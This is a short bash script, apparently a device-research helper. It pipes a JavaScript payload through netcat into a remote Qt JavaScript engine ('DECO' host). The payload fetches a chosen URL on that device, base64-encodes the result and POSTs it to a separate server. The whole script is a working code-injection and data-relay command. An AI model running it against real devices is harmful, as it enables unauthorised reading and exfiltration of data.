#!/bin/bash
source .env
echo 'js function i(o, name){var xhr=new XMLHttpRequest();xhr.open("POST", "'$LOCAL_SERVER_HOST'/'$1'?type=url");xhr.setRequestHeader("Content-Type","application/json;charset=utf-8");xhr.send(JSON.stringify(o));}; (function() { var xhr = new XMLHttpRequest; xhr.open("GET", "'$1'"); xhr.onreadystatechange = function() { if (xhr.readyState == XMLHttpRequest.DONE) { var response = xhr.responseText; i(Qt.btoa(response), "'$1'");}};xhr.send(); return 42; })();' | nc -q2 $DECO_HOST $DECO_PORT